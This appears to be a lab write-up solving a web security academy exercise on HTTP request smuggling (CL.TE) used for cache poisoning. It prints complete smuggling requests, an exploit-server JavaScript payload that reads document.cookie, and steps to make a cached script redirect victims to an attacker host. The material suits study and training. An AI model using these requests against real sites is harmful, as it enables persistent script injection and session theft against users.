## üîç Summary
This lab uses a **CL.TE request smuggling attack** (front-end only understands `Content-Length`, back-end accepts `Transfer-Encoding`) to poison the cache. By smuggling a request that changes the response for `/resources/js/tracking.js`, the attacker makes the cache serve a redirect to their exploit server. Victims loading the site then fetch the poisoned script, which runs attacker-controlled JavaScript (`alert(document.cookie)`), simulating a persistent XSS.

## üõ† Steps to Solve
1. Open a blog post, click "Next post", and try smuggling the resulting request with a different Host header:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 129
   Transfer-Encoding: chunked

   0

   GET /post/next?postId=3 HTTP/1.1
   Host: anything
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10

   x=1
   ```
2. Observe that you can use this request to make the next request to the website get redirected to `/post` on a host of your choice.
3. Go to your exploit server, and create a text/javascript file at `/post` with the contents:
   ```sh
   alert(document.cookie)
   ```
4. Poison the server cache by first relaunching the previous attack using your exploit server's hostname as follows:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 193
   Transfer-Encoding: chunked

   0

   GET /post/next?postId=3 HTTP/1.1
   Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10

   x=1
   ```
5. Then fetch `/resources/js/tracking.js` by sending the following request:
   ```sh
   GET /resources/js/tracking.js HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Connection: close
   ```
   If the attack has succeeded, the response to the `tracking.js` request should be a redirect to your exploit server.
6. Confirm that the cache has been poisoned by repeating the request to `tracking.js` several times and confirming that you receive the redirect every time.

## üìñ Key Takeaways
- **Smuggling for Cache Poisoning**: Instead of directly stealing responses, you poison the cache so every victim requesting `tracking.js` gets redirected to your payload.
- Successful poisoning relies on picking a resource the victim (and all users) will definitely load (`/resources/js/tracking.js`).
- The malicious JavaScript file hosted on your exploit server runs in the victim‚Äôs browser (`alert(document.cookie)` here, but in real-world scenarios could be full XSS or session hijacking).
- Unlike one-off request smuggling, cache poisoning makes the attack **persistent** until the cache expires or is overwritten.
